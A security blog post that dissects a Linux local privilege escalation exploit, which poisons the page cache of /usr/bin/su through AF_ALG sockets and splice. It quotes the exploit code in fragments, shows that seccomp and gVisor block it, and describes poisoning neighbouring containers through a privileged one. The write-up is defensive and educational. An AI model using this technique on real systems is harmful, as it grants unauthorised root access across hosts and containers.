---
title: "Poisoning the Page Cache: Escaping to Root with AF_ALG"
description: >
  A deep dive into a powerful local privilege escalation exploit that abuses
  Linux's cryptographic sockets and the page cache. We explore how it works, why
  it gives passwordless root access, and how container runtimes stop it.
pubDate: 2026-05-02
author: Victor Schroeder
tags:
  - linux
  - security
  - containers
---

This week I spent a late afternoon dissecting a rather cryptic Python script
that was shared by a colleague
([original code here](https://github.com/theori-io/copy-fail-CVE-2026-31431/blob/main/copy_fail_exp.py)
=> **IT'S DANGEROUS! DON'T RUN!**). It contained a malicious local privilege
escalation exploit, leveraging a vulnerability in the Linux kernel (originally
reported by [xint.io](https://xint.io/blog/copy-fail-linux-distributions)).

After some forensic analysis and a good deal of research, I understood what it
was doing. Honestly, it is quite brilliant and also scary. This post aims to
dissect the attack surface and strategy, revealing effects that go way beyond
the initial privilege escalation.

## Important disclaimer

What follows next is potentially dangerous. Don't try any of these commands
unless you know exactly what you are doing.

This content is educational! Even though we can be amazed by the ingenious ways
these attacks are performed, always remember that trying to compromise systems
is a criminal activity!

In my work, I have to guarantee that our own code and the code trusted to us are
executed safely, which includes understanding potential attack vectors and how
to neutralize them. This can only be done by understanding the "criminal mind"
and how these exploits work.

## Testing the exploit

_Of course, I didn't run any of this before fully understanding the depth of the
attack. That would have been irresponsible. I only executed the harmful commands
-- intentionally -- after understanding perfectly what it was doing, and always
using completely isolated VMs with no access to any other systems._

The tests reported below were executed using a Debian Trixie VM on GCP.

The result was immediate. I was granted a highly privileged root shell, without
being asked for a password. What is even more fascinating is that subsequent
calls to `su` also granted me root access without needing to run the script
again. The system was compromised in a persistent way, at least until the next
reboot.

Security comes from understanding. Let's break down exactly what this exploit is
doing, step by step, and why modern container runtimes are our best defense
against it.

## The page cache poisoning

At its core, this attack abuses the Linux kernel's `AF_ALG` cryptographic
subsystem in combination with `os.splice()`. It is a zero-copy mechanism that
corrupts the kernel's page cache, allowing an unprivileged attacker to overwrite
read-only, SUID binaries (like `/usr/bin/su`) directly in memory.

### Stage 1: The Cryptographic Socket

First, the script opens a connection to the kernel's cryptographic API via
`AF_ALG` (family 38):

```python
import socket
a = socket.socket(38, 5, 0) # AF_ALG, SOCK_SEQPACKET
```

### Stage 2: State Corruption

Next, it configures an authenticated encryption algorithm. Crucially, the
`setsockopt` call for `ALG_SET_AEAD_AUTHSIZE` passes a `NULL` pointer (`None`).
This intentionally causes a kernel `-EFAULT`, which disrupts the socket
initialization state and creates the conditions for memory corruption.

```python
v = a.setsockopt
v(279, 1, bytes.fromhex('0800010000000010' + '0'*64)) # Set authenc key
v(279, 5, None, 4) # Trigger invalid memory access
```

### Stage 3: The Paused Payload

The script creates an operation socket and uses `sendmsg` to push a 4-byte
payload chunk. The `MSG_MORE` flag (`32768`) is critical here; it instructs the
kernel to buffer the data and pause the state machine without finalizing the
cryptographic operation.

```python
u, _ = a.accept() # Operation socket
# ...
u.sendmsg(
    [b'A'*4 + c],  # Payload chunk
    [(279, 3, i*4), (279, 2, b'\x10' + i*19), (279, 4, b'\x08' + i*3)],
    32769 # MSG_MORE | MSG_OOB
)
```

### Stage 4: Hijacking the Cache

This is where the magic happens. The attacker uses `os.splice()` to map the
target read-only binary (`/usr/bin/su`) into a pipe, and then splices the pipe
directly into the paused `AF_ALG` socket. This forces the kernel to use the page
cache memory pages of `/usr/bin/su` as the buffer for the cryptographic
operation.

```python
r, w = os.pipe()
n = os.splice
f = os.open('/usr/bin/su', 0) # Open target SUID binary read-only
n(f, w, o, offset_src=0)
n(r, u.fileno(), o)
```

### Stage 5: The Overwrite

By calling `recv`, the attacker finalizes the request. The kernel's crypto
engine performs an in-place "decryption" directly onto the buffer. Because the
buffer is physically mapped to the page cache of `/usr/bin/su`, the kernel
forcefully overwrites the read-only memory pages with the attacker's output!

```python
try:
    u.recv(8 + t)
except:
    0
```

The script loops over a compressed ELF payload, injecting it 4 bytes at a time.
Once the loop completes, `/usr/bin/su` is entirely replaced in memory with the
malicious payload.

## Memory is the battlefield

Once the script finishes overwriting the cache, it simply calls
`os.system("su")`. But it is no longer executing the legitimate `su` binary. It
is executing our malicious payload, which the kernel happily serves directly
from the corrupted page cache.

This explains the persistence. Any subsequent call to `su` by any user on the
system will execute the poisoned cache. The original file on disk remains
untouched.

A simple reboot neutralizes the attack. The poisoned memory is cleared, and the
kernel will load the pristine executable from disk the next time it is
requested. But in a production environment, a compromised `su` binary living in
memory is more than enough time for an attacker to establish a permanent
foothold.

## The level 10 force field

I always run production workloads in containers. Naturally, my next test was to
run this fresh exploit from within a containerized environment.

The good news is the attack fails completely.

Whether using standard `runc` or a sandboxed runtime like `gVisor`, the script
is stopped dead in its tracks. The error looks like this:

```shell
$ python3 exploit.py
Traceback (most recent call last):
  ...
OSError: [Errno 97] Address family not supported by protocol
```

This is where defense-in-depth shines.

Default Seccomp profiles in Docker/`runc` act as a strict allowlist. They block
the `AF_ALG` (38) socket family entirely, returning `EAFNOSUPPORT` (Error 97)
and safely neutralizing the attack surface before any kernel state corruption
can occur.

Similarly, `gVisor` functions as a user-space "guest kernel." It implements only
necessary application syscalls and simply does not support the `AF_ALG`
subsystem. The exploit's syscalls never reach the potentially vulnerable host
Linux kernel.

Just like a level 10 force field in Star Trek, it stops the threat before it can
do any damage.

### The Blast Radius of Shared Cache

While containers provide strong isolation, it is worth noting a terrifying quirk
of how container runtimes work.

Most runtimes use OverlayFS. Multiple containers running from the same base
image share the underlying read-only layers in memory (the page cache). If an
attacker successfully executed this exploit inside a container that lacked the
Seccomp protections, they wouldn't just compromise their own container.

Because the exploit modifies the shared page cache for the inode corresponding
to `/usr/bin/su` in the base image layer, **every other container running on the
same host that shares that exact image layer would instantly have a compromised
`/usr/bin/su` binary.**

To see just how scary this is, consider this highly plausible scenario. I built
a simple, unprivileged Docker image:

```dockerfile
FROM debian:latest
RUN useradd foobar && apt-get update && apt-get install --assume-yes python3
USER foobar
CMD ["tail", "--follow", "/dev/null"]
```

I spun up a few standard containers from this image. They are running securely
as the unprivileged user `foobar`, with the default restricted Seccomp profile.
This is how it should be, right? We are safe!

Well, then I started a single, ephemeral container using the same image, but
passed the `--privileged` flag. You know, this kind of thing happens in
production, be it because someone was not careful enough or in a desperate
debugging session:

```shell
$ docker run --rm --interactive --tty --privileged test-copy-fail:latest bash
```

Because of the `--privileged` flag, `runc` does not apply the Seccomp filters,
and the `AF_ALG` sockets are fully exposed. I executed the Python exploit inside
this ephemeral container and exited.

Next, I attached a shell to one of the _previously running_ unprivileged
containers and simply typed `su`.

Instantly, I was dropped into a root shell.

What makes this even more devastating is that it did not matter if those
unprivileged containers were running under a hardened sandbox like gVisor.
Because the attack happened elsewhere (in the privileged container sharing the
same underlying OverlayFS layer), the memory was already poisoned. The sandbox
prevents the attack from being _performed_, but it cannot protect the container
from _consuming_ an already compromised page cache served by the host.

Even when following good practices for your long-running workloads, a single
ephemeral run of a privileged container can silently compromise the entire node
of currently running containers!

## Patch early and often

Using state-of-the-art runtimes such as gVisor proved again that they can save
many headaches. They provide a critical layer of isolation that mitigates entire
classes of kernel vulnerabilities.

But sandboxes are not an excuse to ignore the underlying issue. Keep your
systems up-to-date. Keep your kernels patched. Don't run containers with
unnecessary capabilities or with `--privileged`. Use minimal base images (like
Distroless, Alpine) that don't even include SUID binaries like `su` in the first
place.

Understanding these attacks reminds us that the boundary between user space and
the kernel is complex and constantly tested. It is our job to make sure the
shields hold.
